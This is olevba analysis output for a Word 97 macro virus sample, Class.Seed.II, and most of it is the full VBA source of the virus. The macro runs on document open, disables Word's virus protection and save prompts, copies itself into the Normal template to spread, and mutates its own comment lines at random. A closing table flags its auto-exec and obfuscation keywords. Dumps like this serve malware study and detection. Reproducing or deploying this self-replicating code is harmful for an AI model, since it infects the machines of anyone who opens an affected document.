olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.y-fce2846dca2db4fadc08f128e7ed9d53b9d4da2b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.y-fce2846dca2db4fadc08f128e7ed9d53b9d4da2b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'870114305295011790436870114305295011790436870114305295011790436870114305295011790436
Randomize
'1407544960020484765625140754496002048476562514075449600204847656251407544960020484765625
x = 0: o = 0
'419700779562034461025419700779562034461025419700779562034461025419700779562034461025
On Error GoTo 93
'68349902767665702916683499027676657029166834990276766570291668349902767665702916
Options.VirusProtection = False
'15419051424133192831721154190514241331928317211541905142413319283172115419051424133192831721
Options.SaveNormalPrompt = False
'10020390250046773145441100203902500467731454411002039025004677314544110020390250046773145441
Options.ConfirmConversions = False
'8874619740914951175625887461974091495117562588746197409149511756258874619740914951175625
fx = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'730247933611106227600730247933611106227600730247933611106227600730247933611106227600
xf = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'74308579216904084624743085792169040846247430857921690408462474308579216904084624
If xf > 96 And fx > 0 Then GoTo 93
'11196652899650546280625111966528996505462806251119665289965054628062511196652899650546280625
If xf < 96 Then
'622063457449452311729622063457449452311729622063457449452311729622063457449452311729
    Set xs = NormalTemplate.VBProject.VBComponents.Item(1)
'1282563806414727662564128256380641472766256412825638064147276625641282563806414727662564
    ActiveDocument.VBProject.VBComponents.Item(1).Name = xs.Name
'1604934259610770495961160493425961077049596116049342596107704959611604934259610770495961
    ActiveDocument.VBProject.VBComponents.Item(1).Export Application.StartupPath & Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(73) + Chr(73)
'808173926568373897081808173926568373897081808173926568373897081808173926568373897081
End If
'6476159728947482589025647615972894748258902564761597289474825890256476159728947482589025
If fx = 0 Then Set xs = ActiveDocument.VBProject.VBComponents.Item(1)
'67625952254491278289676259522544912782896762595225449127828967625952254491278289
k = Int(Rnd(1) * 100) + 1
'16457707376141417134144164577073761414171341441645770737614141713414416457707376141417134144
If k = 99 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.cannabisculture.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(73) + Chr(73)
'3324349958419811688516332434995841981168851633243499584198116885163324349958419811688516
l = Int(Rnd(1) * 75) + 1
'360372096110419918084360372096110419918084360372096110419918084360372096110419918084
If l = 74 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.Microsoft.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(73) + Chr(73)
'15736930320415829414225157369303204158294142251573693032041582941422515736930320415829414225
m = Int(Rnd(1) * 50) + 1
'164157866896896223969164157866896896223969164157866896896223969164157866896896223969
If m = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(80) + Chr(82) + Chr(79) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)
'233545636841391513809233545636841391513809233545636841391513809233545636841391513809
n = Int(Rnd(1) * 25) + 1
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
If n = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(32) + Chr(73) + Chr(73)
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
xs.codemodule.AddFromFile Application.StartupPath & Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(73) + Chr(73)
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
With xs.codemodule
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
    For p = 1 To 4
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
    .deletelines 1
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
    Next p
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
End With
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
If xf < 96 Then
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
    With xs.codemodule
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
    .replaceline 1, "Sub AutoClose()"
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
    .replaceline 99, "Sub ToolsMacro()"
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
    End With
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
End If
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
With xs.codemodule
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
    For p = 2 To 44 Step 2
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
    x = Int(Rnd(414835) * 403989) + 8485
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
    o = Int(Rnd(298368) * 235865) + 2988
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
    .replaceline p, "'" & x * x & o * o & x * x & o * o & x * x & o * o & x * x & o * o
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
Next p
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
    For xp = 46 To 98 Step 2
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
    .replaceline xp, "'" & Application.Assistant & Application.DisplayRecentFiles & Application.FocusInMailHeader & Application.Build & Application.StartupPath & Application.ActiveDocument & Application.Version
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
Next xp
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
End With
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
93:
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
If xf > 98 And fx = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
End Sub
'ClippitTrueFalse8.0.3514c:\program files\microsoft office\office\startuptest.doc8.0
Sub ViewVBCode()
'Word97/Class.Seed.II by Virus :) Smile!
End Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.cannabisc|URL                                          |
|          |ulture.com          |                                             |
|IOC       |http://www.Microsoft|URL                                          |
|          |.com                |                                             |
+----------+--------------------+---------------------------------------------+

